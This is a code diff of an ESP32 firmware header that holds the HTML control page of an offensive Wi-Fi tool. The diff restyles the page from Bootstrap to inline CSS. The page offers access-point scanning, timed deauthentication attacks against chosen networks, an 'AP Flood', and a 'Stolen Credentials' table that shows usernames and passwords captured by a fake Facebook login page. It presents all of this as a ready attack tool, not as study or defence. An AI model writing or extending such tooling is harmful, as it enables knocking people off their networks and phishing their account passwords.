@@ -1,221 +1,218 @@
 #ifndef HTML_PAGES_H
 #define HTML_PAGES_H
 
-char* root_page_html =
-"<!DOCTYPE html>\n"
-"<html lang=\"en\">\n"
-"<head>\n"
-"  <meta charset=\"UTF-8\" />\n"
-"  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n"
-"  <title>ESP32 Wi-Fi Attack Control</title>\n"
-"  <link\n"
-"    rel=\"stylesheet\"\n"
-"    href=\"https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css\"\n"
-"  />\n"
-"</head>\n"
-"<body>\n"
-"  <div class=\"container my-4\">\n"
-"    <h1 class=\"mb-4\">ESP32 Attack Dashboard</h1>\n"
-"\n"
-"    <!-- Scan Section -->\n"
-"    <div class=\"card mb-4\">\n"
-"      <div class=\"card-header\">Scan Nearby APs</div>\n"
-"      <div class=\"card-body\">\n"
-"        <button id=\"btn-scan\" class=\"btn btn-primary\">Scan</button>\n"
-"        <div id=\"scan-error\" class=\"text-danger mt-2\" style=\"display:none;\">\n"
-"          Error scanning networks.\n"
-"        </div>\n"
-"        <table\n"
-"          id=\"scan-table\"\n"
-"          class=\"table table-striped mt-3\"\n"
-"          style=\"display:none;\"\n"
-"        >\n"
-"          <thead>\n"
-"            <tr>\n"
-"              <th>SSID</th>\n"
-"              <th>BSSID</th>\n"
-"              <th>Deauthenticate</th>\n"
-"            </tr>\n"
-"          </thead>\n"
-"          <tbody></tbody>\n"
-"        </table>\n"
-"      </div>\n"
-"    </div>\n"
-"\n"
-"    <!-- Flood Section -->\n"
-"    <div class=\"card mb-4\">\n"
-"      <div class=\"card-header\">AP Flood</div>\n"
-"      <div class=\"card-body\">\n"
-"        <button id=\"btn-flood\" class=\"btn btn-warning\">Start Flood</button>\n"
-"        <button id=\"btn-flood-stop\" class=\"btn btn-danger\">Stop Flood</button>\n"
-"        <div id=\"flood-status\" class=\"mt-2\"></div>\n"
-"      </div>\n"
-"    </div>\n"
-"\n"
-"    <!-- Facebook Leak Section -->\n"
-"    <div class=\"card mb-4\">\n"
-"      <div class=\"card-header\">Stolen Credentials</div>\n"
-"      <div class=\"card-body\">\n"
-"        <button id=\"btn-facebook\" class=\"btn btn-secondary\">Load</button>\n"
-"        <div id=\"facebook-error\" class=\"text-danger mt-2\" style=\"display:none;\">\n"
-"          Error loading credentials.\n"
-"        </div>\n"
-"        <table\n"
-"          id=\"facebook-table\"\n"
-"          class=\"table table-bordered mt-3\"\n"
-"          style=\"display:none;\"\n"
-"        >\n"
-"          <thead>\n"
-"            <tr>\n"
-"              <th>Username</th>\n"
-"              <th>Password</th>\n"
-"            </tr>\n"
-"          </thead>\n"
-"          <tbody></tbody>\n"
-"        </table>\n"
-"      </div>\n"
-"    </div>\n"
-"  </div>\n"
-"\n"
-"  <script>\n"
-"    document.getElementById('btn-scan').onclick = async () => {\n"
-"      const table = document.getElementById('scan-table');\n"
-"      const tbody = table.querySelector('tbody');\n"
-"      document.getElementById('scan-error').style.display = 'none';\n"
-"      table.style.display = 'none';\n"
-"      tbody.innerHTML = '';\n"
-"\n"
-"      try {\n"
-"        const res = await fetch('/scan');\n"
-"        if (res.status !== 200) throw new Error();\n"
-"        const aps = await res.json();\n"
-"        aps.forEach(ap => {\n"
-"          const tr = document.createElement('tr');\n"
-"          tr.innerHTML = `\n"
-"            <td>${ap.ssid}</td>\n"
-"            <td>${ap.bssid}</td>\n"
-"            <td>\n"
-"              <button class=\"btn btn-sm btn-danger\" onclick=\"deauth('${ap.bssid}')\">\n"
-"                Deauth\n"
-"              </button>\n"
-"            </td>`;\n"
-"          tbody.appendChild(tr);\n"
-"        });\n"
-"        table.style.display = '';\n"
-"      } catch {\n"
-"        document.getElementById('scan-error').style.display = '';\n"
-"      }\n"
-"    };\n"
-"\n"
-"    async function deauth(bssid) {\n"
-"      const timeout = parseInt(prompt('Duration (seconds)?', '30'), 10);\n"
-"      if (!timeout || isNaN(timeout) || timeout <= 0) return;\n"
-"\n"
-"      const res = await fetch(`/attack?bssid=${bssid}&timeout=${encodeURIComponent(timeout)}`);\n"
-"      if (res.status === 200) {\n"
-"        showCountdown(timeout);\n"
-"      } else if (res.status === 400) {\n"
-"        alert('Missing parameters');\n"
-"      } else {\n"
-"        alert('Failed to start attack');\n"
-"      }\n"
-"    }\n"
-"\n"
-"    function showCountdown(seconds) {\n"
-"      // Replace entire body with countdown message\n"
-"      document.body.innerHTML = `\n"
-"        <div class=\"d-flex vh-100 vw-100 align-items-center justify-content-center bg-dark text-white flex-column\">\n"
-"          <h1>Deauthentication in progress</h1>\n"
-"          <p>Please wait <span id=\"countdown\">${seconds}</span> seconds...</p>\n"
-"        </div>\n"
-"      `;\n"
-"      let remaining = seconds;\n"
-"      const el = document.getElementById('countdown');\n"
-"\n"
-"      const interval = setInterval(() => {\n"
-"        remaining--;\n"
-"        if (remaining >= 0) {\n"
-"          el.textContent = remaining;\n"
-"        }\n"
-"        if (remaining <= 0) {\n"
-"          clearInterval(interval);\n"
-"          document.body.innerHTML = `\n"
-"            <div class=\"d-flex vh-100 vw-100 align-items-center justify-content-center bg-dark text-white flex-column\">\n"
-"              <h1>Attack Finished</h1>\n"
-"              <p>Please reconnect to the ESP32 Wi-Fi network and <strong>refresh</strong> this page.</p>\n"
-"            </div>\n"
-"          `;\n"
-"        }\n"
-"      }, 1000);\n"
-"    }\n"
-"\n"
-"    // Flood controls\n"
-"    const floodStatusEl = document.getElementById('flood-status');\n"
-"    async function updateFloodButtons() {\n"
-"      try {\n"
-"        const res = await fetch('/flood/stop');\n"
-"        if (res.status === 409) {\n"
-"          document.getElementById('btn-flood').disabled = false;\n"
-"          document.getElementById('btn-flood-stop').disabled = true;\n"
-"          floodStatusEl.textContent = 'Flood not running';\n"
-"        } else {\n"
-"          throw new Error();\n"
-"        }\n"
-"      } catch {\n"
-"        document.getElementById('btn-flood').disabled = true;\n"
-"        document.getElementById('btn-flood-stop').disabled = false;\n"
-"        floodStatusEl.textContent = 'Flood is running';\n"
-"      }\n"
-"    }\n"
-"\n"
-"    document.getElementById('btn-flood').onclick = async () => {\n"
-"      const res = await fetch('/flood');\n"
-"      if (res.status === 200) {\n"
-"        alert('Flood started');\n"
-"      } else alert('Cannot start flood');\n"
-"      document.getElementById('btn-flood').disabled = true;\n"
-"      document.getElementById('btn-flood-stop').disabled = false;\n"
-"      floodStatusEl.textContent = 'Flood is running';\n"
-"    };\n"
-"\n"
-"    document.getElementById('btn-flood-stop').onclick = async () => {\n"
-"      const res = await fetch('/flood/stop');\n"
-"      if (res.status === 200) {\n"
-"        alert('Flood stopped');\n"
-"      } else alert('Flood not running');\n"
-"      updateFloodButtons();\n"
-"    };\n"
-"\n"
-"    // Initial flood status\n"
-"    updateFloodButtons();\n"
-"\n"
-"    // Facebook credentials\n"
-"    document.getElementById('btn-facebook').onclick = async () => {\n"
-"      const table = document.getElementById('facebook-table');\n"
-"      const tbody = table.querySelector('tbody');\n"
-"      document.getElementById('facebook-error').style.display = 'none';\n"
-"      table.style.display = 'none';\n"
-"      tbody.innerHTML = '';\n"
-"\n"
-"      try {\n"
-"        const res = await fetch('/facebook');\n"
-"        if (res.status !== 200) throw new Error();\n"
-"        const creds = await res.json();\n"
-"        creds.forEach(entry => {\n"
-"          const tr = document.createElement('tr');\n"
-"          tr.innerHTML = `\n"
-"            <td>${entry.username}</td>\n"
-"            <td>${entry.password}</td>`;\n"
-"          tbody.appendChild(tr);\n"
-"        });\n"
-"        table.style.display = '';\n"
-"      } catch {\n"
-"        document.getElementById('facebook-error').style.display = '';\n"
-"      }\n"
-"    };\n"
-"  </script>\n"
-"</body>\n"
-"</html>\n";
+char* root_page_html = R"rawliteral(
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>ESP32 Wi-Fi Attack Control</title>
+  <style>
+    /* Container & Spacing */
+    .container  { max-width: 600px; margin: 16px auto; padding: 0 8px; }
+    .mb-4       { margin-bottom: 16px; }
+    .my-4       { margin: 16px 0; }
+    .mt-2       { margin-top: 8px; }
+
+    /* Card */
+    .card       { border: 1px solid #ccc; border-radius: 4px; overflow: hidden; margin-bottom: 16px; }
+    .card-header{ background: #f5f5f5; padding: 8px 16px; font-weight: bold; }
+    .card-body  { padding: 16px; }
+
+    /* Buttons */
+    .btn            { display: inline-block; padding: 8px 12px; border: none; border-radius: 4px; 
+                      text-decoration: none; cursor: pointer; font-size: 1em; color: #fff; }
+    .btn-sm         { padding: 4px 8px; font-size: 0.85em; }
+    .btn-primary    { background: #007bff; }
+    .btn-warning    { background: #ffc107; color: #212529; }
+    .btn-danger     { background: #dc3545; }
+    .btn-secondary  { background: #6c757d; }
+
+    /* Table */
+    table          { width: 100%; border-collapse: collapse; margin-top: 8px; }
+    th, td         { border: 1px solid #ddd; padding: 8px; text-align: left; }
+    tr:nth-child(even) { background: #f9f9f9; }
+
+    /* Text & Helpers */
+    .text-danger { color: #dc3545; }
+    .hidden      { display: none; }
+
+    /* Fullscreen centered overlay */
+    .centered-fullscreen {
+      position: absolute; top: 0; left: 0; width: 100vw; height: 100vh;
+      display: flex; align-items: center; justify-content: center;
+      background: #343a40; color: #fff; flex-direction: column;
+    }
+  </style>
+</head>
+<body>
+  <div class="container my-4">
+    <h1 class="mb-4">ESP32 Attack Dashboard</h1>
+
+    <!-- Scan Section -->
+    <div class="card mb-4">
+      <div class="card-header">Scan Nearby APs</div>
+      <div class="card-body">
+        <button id="btn-scan" class="btn btn-primary">Scan</button>
+        <div id="scan-error" class="text-danger mt-2 hidden">
+          Error scanning networks.
+        </div>
+        <table id="scan-table" class="hidden">
+          <thead>
+            <tr><th>SSID</th><th>BSSID</th><th>Deauthenticate</th></tr>
+          </thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- Flood Section -->
+    <div class="card mb-4">
+      <div class="card-header">AP Flood</div>
+      <div class="card-body">
+        <button id="btn-flood" class="btn btn-warning">Start Flood</button>
+        <button id="btn-flood-stop" class="btn btn-danger">Stop Flood</button>
+        <div id="flood-status" class="mt-2"></div>
+      </div>
+    </div>
+
+    <!-- Facebook Leak Section -->
+    <div class="card mb-4">
+      <div class="card-header">Stolen Credentials</div>
+      <div class="card-body">
+        <button id="btn-facebook" class="btn btn-secondary">Load</button>
+        <div id="facebook-error" class="text-danger mt-2 hidden">
+          Error loading credentials.
+        </div>
+        <table id="facebook-table" class="hidden">
+          <thead><tr><th>Username</th><th>Password</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // === Scan ===
+    document.getElementById('btn-scan').onclick = async () => {
+      const table = document.getElementById('scan-table');
+      const err   = document.getElementById('scan-error');
+      const tbody = table.querySelector('tbody');
+      err.classList.add('hidden'); table.classList.add('hidden'); tbody.innerHTML = '';
+
+      try {
+        const res = await fetch('/scan');
+        if (res.status !== 200) throw 0;
+        const aps = await res.json();
+        aps.forEach(ap => {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `
+            <td>${ap.ssid}</td>
+            <td>${ap.bssid}</td>
+            <td>
+              <button class="btn btn-sm btn-danger" onclick="deauth('${ap.bssid}')">Deauth</button>
+            </td>`;
+          tbody.appendChild(tr);
+        });
+        table.classList.remove('hidden');
+      } catch {
+        err.classList.remove('hidden');
+      }
+    };
+
+    async function deauth(bssid) {
+      const timeout = parseInt(prompt('Duration (seconds)?', '30'), 10);
+      if (!timeout || timeout <= 0) return;
+      const res = await fetch(`/attack?bssid=${bssid}&timeout=${encodeURIComponent(timeout)}`);
+      if (res.status === 200) {
+        showCountdown(timeout);
+      } else if (res.status === 400) {
+        alert('Missing parameters');
+      } else {
+        alert('Failed to start attack');
+      }
+    }
+
+    function showCountdown(seconds) {
+      document.body.innerHTML = `
+        <div class="centered-fullscreen">
+          <h1>Deauthentication in progress</h1>
+          <p>Please wait <span id="countdown">${seconds}</span> seconds...</p>
+        </div>`;
+      let remaining = seconds;
+      const el = document.getElementById('countdown');
+      const iv = setInterval(() => {
+        remaining--;
+        if (remaining >= 0) el.textContent = remaining;
+        if (remaining <= 0) {
+          clearInterval(iv);
+          document.body.innerHTML = `
+            <div class="centered-fullscreen">
+              <h1>Attack Finished</h1>
+              <p>Please reconnect to the ESP32 Wi-Fi network and <strong>refresh</strong> this page.</p>
+            </div>`;
+        }
+      }, 1000);
+    }
+
+    // === Flood Controls ===
+    async function updateFloodButtons() {
+      try {
+        const res = await fetch('/flood/stop');
+        if (res.status === 409) {
+          btnFlood.disabled = false;
+          btnFloodStop.disabled = true;
+          floodStatus.textContent = 'Flood not running';
+        } else throw 0;
+      } catch {
+        btnFlood.disabled = true;
+        btnFloodStop.disabled = false;
+        floodStatus.textContent = 'Flood is running';
+      }
+    }
+    const btnFlood     = document.getElementById('btn-flood');
+    const btnFloodStop = document.getElementById('btn-flood-stop');
+    const floodStatus  = document.getElementById('flood-status');
+
+    btnFlood.onclick = async () => {
+      const res = await fetch('/flood');
+      res.status === 200 ? alert('Flood started') : alert('Cannot start flood');
+      btnFlood.disabled = true;
+      btnFloodStop.disabled = false;
+      floodStatus.textContent = 'Flood is running';
+    };
+    btnFloodStop.onclick = async () => {
+      const res = await fetch('/flood/stop');
+      res.status === 200 ? alert('Flood stopped') : alert('Flood not running');
+      updateFloodButtons();
+    };
+    updateFloodButtons();
+
+    // === Facebook Leak ===
+    document.getElementById('btn-facebook').onclick = async () => {
+      const table = document.getElementById('facebook-table');
+      const err   = document.getElementById('facebook-error');
+      const tbody = table.querySelector('tbody');
+      err.classList.add('hidden'); table.classList.add('hidden'); tbody.innerHTML = '';
+
+      try {
+        const res = await fetch('/facebook');
+        if (res.status !== 200) throw 0;
+        (await res.json()).forEach(entry => {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `<td>${entry.username}</td><td>${entry.password}</td>`;
+          tbody.appendChild(tr);
+        });
+        table.classList.remove('hidden');
+      } catch {
+        err.classList.remove('hidden');
+      }
+    };
+  </script>
+</body>
+</html>
+)rawliteral";
 
 const char* facebook_page_html = 
 "<!DOCTYPE html>\n"
